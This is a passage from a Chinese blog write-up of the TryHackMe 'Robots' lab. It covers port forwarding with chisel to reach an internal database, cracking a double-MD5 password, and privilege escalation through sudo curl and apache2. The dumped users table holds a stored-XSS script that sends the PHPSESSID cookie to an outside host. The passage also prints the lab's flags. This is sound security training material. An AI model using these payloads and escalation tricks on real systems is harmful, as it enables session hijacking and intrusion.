proxychains-ng 4.17\nEnter password: \n[proxychains] Strict chain  ...  127.0.0.1:8001  ...  127.0.0.1:3306  ...  OK\nERROR 2013 (HY000): Lost connection to server at \u003cspan class=\"hljs-string\"\u003e'handshake: reading initial communication packet'\u003c/span\u003e, system error: 11\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e失败 - Stowaway forward\u003c/h3\u003e\n\u003cp\u003e反向不行我们直接转发过来试试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(node 0) \u003e\u003e forward 3306 127.0.0.1:3306\n[*] Trying to listen on 0.0.0.0:3306......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Forward start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果是输入密码后直接卡住了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots mysql -h 127.0.0.1 --protocol=TCP -urobots -p \n\nEnter password: \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e成功 - chisel\u003c/h3\u003e\n\u003cp\u003e换一个工具，服务端开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots chisel server --reverse --port 2333   \n2025/05/27 00:04:37 server: Reverse tunnelling enabled\n2025/05/27 00:04:37 server: Fingerprint +OtHvMvU87AScwm7Y/c1/NuYSwGo2AypaVI6w47XEJU=\n2025/05/27 00:04:37 server: Listening on http://0.0.0.0:2333\n2025/05/27 00:06:04 server: session#1: tun: proxy#R:3306=\u003e172.18.0.2:3306: Listening\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e靶机连接，并且转发端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@robots:/tmp$ ./chisel client 10.21.192.44:2333 R:3306:172.18.0.2:3306\n2025/05/27 04:06:02 client: Connecting to ws://10.21.192.44:2333\n2025/05/27 04:06:05 client: Connected (Latency 329.446954ms)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e数据库连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots mysql -h 127.0.0.1 -urobots -p               \n\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 92\nServer version: 11.5.2-MariaDB-ubu2404 mariadb.org binary distribution\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType \u003cspan class=\"hljs-string\"\u003e'help;'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'\\h'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e. Type \u003cspan class=\"hljs-string\"\u003e'\\c'\u003c/span\u003e to clear the current input statement.\n\nMariaDB [(none)]\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [web]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e;\n+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | username                                                                                                                                                                                                                                    | password                         | group   |\n+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------+\n|  1 | admin                                                                                                                                                                                                                                       | 3e3d6c2d540d49b1a11cf74ac5a37233 | admin   |\n|  2 | rgiskard                                                                                                                                                                                                                                    | dfb35334bf2a1338fa40e5fbb4ae4753 | nologin |\n|  3 | \u0026#x3C;script\u003efetch(\u003cspan class=\"hljs-string\"\u003e'/harm/to/self/server_info.php'\u003c/span\u003e,{credentials:\u003cspan class=\"hljs-string\"\u003e'include'\u003c/span\u003e}).\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e(res=\u003eres.text()).\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e(text=\u003e{var m=text.match(/PHPSESSID=[^\\s\u0026#x3C;\u003e\u003cspan class=\"hljs-string\"\u003e\"']+/);if(m)location='http://10.21.192.44/Cookie?content='+encodeURIComponent(m[0]);});\u0026#x3C;/script\u003e | a978c62e8836b7b79411e4800b19363b | guest   |\n+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------+\n3 rows in set (0.307 sec)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e爆破密码\u003c/h3\u003e\n\u003cp\u003e我们知道密码是 \u003ccode\u003eusername\u003c/code\u003e+\u003ccode\u003eddmm\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e并且在写入数据库时还会进行一次 \u003ccode\u003emd5\u003c/code\u003e ，所以是双重\u003ccode\u003emd5\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$stmt\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$pdo\u003c/span\u003e-\u003eprepare(\u003cspan class=\"hljs-string\"\u003e\"INSERT into users (username,password,`group`) values (?,md5(?),'guest')\"\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编写脚本进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e pass.py \n\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/env python3\u003c/span\u003e\n\nimport hashlib\n\ndef md5_hash(text: str) -\u003e str:\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e hashlib.md5(text.encode()).hexdigest()\n\ndef brute_force(prefix: str, target: str):\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e day \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(1, 32):\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e month \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(1, 13):\n            suffix = f\u003cspan class=\"hljs-string\"\u003e\"{day:02d}{month:02d}\"\u003c/span\u003e\n            candidate = prefix + suffix\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e md5_hash(md5_hash(candidate)) == target:\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"[+] Found: {candidate}\"\u003c/span\u003e)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e candidate\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[-] No match found.\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e None\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    prefix = \u003cspan class=\"hljs-string\"\u003e\"rgiskard\"\u003c/span\u003e\n    target = \u003cspan class=\"hljs-string\"\u003e\"dfb35334bf2a1338fa40e5fbb4ae4753\"\u003c/span\u003e \n    result = brute_force(prefix, target)\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e result:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Success.\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Failed.\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots python pass.py\n[+] Found: rgiskard2209\nSuccess.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录 SSH，意外的失败了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots ssh -o IdentitiesOnly=\u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e -o PubkeyAuthentication=no -o PasswordAuthentication=\u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e rgsisard@10.10.207.123\n\nrgsikard@10.10.207.123\u003cspan class=\"hljs-string\"\u003e's password: \nPermission denied, please try again.\nrgsikard@10.10.207.123'\u003c/span\u003es password: \nReceived disconnect from 10.10.207.123 port 22:2: Too many authentication failures\nDisconnected from 10.10.207.123 port 22\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试使用 MD5\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots python pass.py\n[+] Found: rgiskard2209\n[+] MD5: b246f21ff68cae9503ed6d18edd32dae\n[+] DMD5: dfb35334bf2a1338fa40e5fbb4ae4753\nSuccess.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用密码的\u003ccode\u003ehash\u003c/code\u003e值可以登录进去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots ssh -o IdentitiesOnly=\u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e -o PubkeyAuthentication=no -o PasswordAuthentication=\u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e rgiskard@10.10.207.123\n\nrgiskard@10.10.207.123\u003cspan class=\"hljs-string\"\u003e's password: \nrgiskard@ubuntu-jammy:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003ch3\u003eTo Dolivaw\u003c/h3\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ergiskard@ubuntu-jammy:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e rgiskard: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e rgiskard on ubuntu-jammy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser rgiskard may run the following commands on ubuntu-jammy:\n    (dolivaw) /usr/bin/curl 127.0.0.1/*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们可以使用 \u003ccode\u003e-o\u003c/code\u003e 参数给\u003ccode\u003edolivaw\u003c/code\u003e写入我们的公钥\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeRobots/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e如何通过 \u003ccode\u003ecurl\u003c/code\u003e 写入公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ergiskard@ubuntu-jammy:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -u dolivaw /usr/bin/curl 127.0.0.1/ -o /tmp/noting file:///tmp/ssh -o /home/dolivaw/.ssh/authorized_keys\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   274  100   274    0     0   102k      0 --:--:-- --:--:-- --:--:--  133k\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   563  100   563    0     0   847k      0 --:--:-- --:--:-- --:--:--  847k\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录 \u003ccode\u003edolivaw\u003c/code\u003e 用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  robots ssh dolivaw@10.10.207.123   \ndolivaw@ubuntu-jammy:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo Root\u003c/h3\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edolivaw@ubuntu-jammy:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e dolivaw on ubuntu-jammy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser dolivaw may run the following commands on ubuntu-jammy:\n    (ALL) NOPASSWD: /usr/sbin/apache2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e到这里不太会，看了下\u003ccode\u003eWP\u003c/code\u003e ，可以通过 \u003ccode\u003e-c\u003c/code\u003e 参数来泄露 \u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e首先先注释配置文件的一些配置\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edolivaw@ubuntu-jammy:~$ \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e /etc/apache2/apache2.conf /tmp/apache2.conf\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e 80 \u003cspan class=\"hljs-comment\"\u003e#DefaultRuntimeDir ${APACHE_RUN_DIR}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行\u003ccode\u003eapache2\u003c/code\u003e 泄露 \u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edolivaw@ubuntu-jammy:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/sbin/apache2  -C \u003cspan class=\"hljs-string\"\u003e\"Include /root/root.txt\"\u003c/span\u003e  -f /tmp/apache2.conf -k start\n[Tue May 27 05:24:47.549392 2025] [core:warn] [pid 5096] AH00111: Config variable \u003cspan class=\"hljs-variable\"\u003e${APACHE_PID_FILE}\u003c/span\u003e is not defined\n[Tue May 27 05:24:47.549461 2025] [core:warn] [pid 5096] AH00111: Config variable \u003cspan class=\"hljs-variable\"\u003e${APACHE_RUN_USER}\u003c/span\u003e is not defined\n[Tue May 27 05:24:47.549466 2025] [core:warn] [pid 5096] AH00111: Config variable \u003cspan class=\"hljs-variable\"\u003e${APACHE_RUN_GROUP}\u003c/span\u003e is not defined\n[Tue May 27 05:24:47.549477 2025] [core:warn] [pid 5096] AH00111: Config variable \u003cspan class=\"hljs-variable\"\u003e${APACHE_LOG_DIR}\u003c/span\u003e is not defined\n[Tue May 27 05:24:47.552532 2025] [core:warn] [pid 5096:tid 140527105746816] AH00111: Config variable \u003cspan class=\"hljs-variable\"\u003e${APACHE_LOG_DIR}\u003c/span\u003e is not defined\n[Tue May 27 05:24:47.552716 2025] [core:warn] [pid 5096:tid 140527105746816] AH00111: Config variable \u003cspan class=\"hljs-variable\"\u003e${APACHE_LOG_DIR}\u003c/span\u003e is not defined\n[Tue May 27 05:24:47.552737 2025] [core:warn] [pid 5096:tid 140527105746816] AH00111: Config variable \u003cspan class=\"hljs-variable\"\u003e${APACHE_LOG_DIR}\u003c/span\u003e is not defined\nAH00526: Syntax error on line 1 of /root/root.txt:\nInvalid \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'THM{2a279561f5eea907f7617df3982cee24}'\u003c/span\u003e, perhaps misspelled or defined by a module not included \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the server configuration\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eTHM{2a279561f5eea907f7617df3982cee24}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edolivaw@ubuntu-jammy:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nTHM{9b17d3c3e86c944c868c57b5a7fa07d8}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e很好玩的机器，存储型 XSS 窃取管理员 Cookie。\u003c/p\u003e\n\u003cp\u003e也遇到 stowaway 的一些 bug，转发过来的 3306 端口貌似会有问题，通过 chisel 解决。\u003c/p\u003e\n\u003cp\u003e最后是学习到本地使用apache2 进行权限提升（任意文件读取），其实有很多方法可以获得\u003ccode\u003eroot shell\u003c/code\u003e的，其中一个文章（\u003ca href=\"https://0xb0b.gitbook.io/writeups/tryhackme/2025/robots#shell-as-root%EF%BC%89%E6%98%AF%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%E8%80%8C%E8%8E%B7%E5%BE%97\"\u003ehttps://0xb0b.gitbook.io/writeups/tryhackme/2025/robots#shell-as-root）是通过日志文件写入公钥而获得\u003c/a\u003e \u003ccode\u003eroot shell\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e以及文章：\u003ca href=\"https://jaxafed.github.io/posts/tryhackme-robots/#unintended-2-rce-with-cgi-scripts\"\u003ehttps://jaxafed.github.io/posts/tryhackme-robots/#unintended-2-rce-with-cgi-scripts\u003c/a\u003e ，其中使用 CGI 脚本活得 Docker 组权限，然后再进行权限提升。\u003c/p\u003e","title":"TryHackMe - Robots","date":"2025-05-27","updated":"2025-05-27","tags":["TryHackMe","Linux靶机","XSS","Mysql","Apache2","PortForward"],"categories":"靶机","comments":true},"recentPosts":[{"title":"HackTheBox - Machine -Support","slug":"HackTheBoxMachine -Support","date":"2025-06-05","updated":"2025-06-05","isEncrypted":false},{"title":"HackTheBox - Machine - Hospital","slug":"HackTheBoxMachine - Hospital","date":"2025-06-04","updated":"2025-06-04","isEncrypted":false},{"title":"HackTheBox - Season8 - Certificate","slug":"HackTheBoxSeason8 - Certificate","date":"2025-06-02","updated":"2025-06-02","isEncrypted":true},{"title":"HackTheBox - Machine - Strutted","slug":"HackTheBoxMachine - Strutted","date":"2025-06-02","updated":"2025-06-02","isEncrypted":false},{"title":"Vulnyx - Build","slug":"VulnyxBuild","date":"2025-06-01","updated":"2025-06-01","isEncrypted":false}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"05","day":"27","id":"TryHackMeRobots"},"buildId":"VCIb495z0pnVej4jJq3tb","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>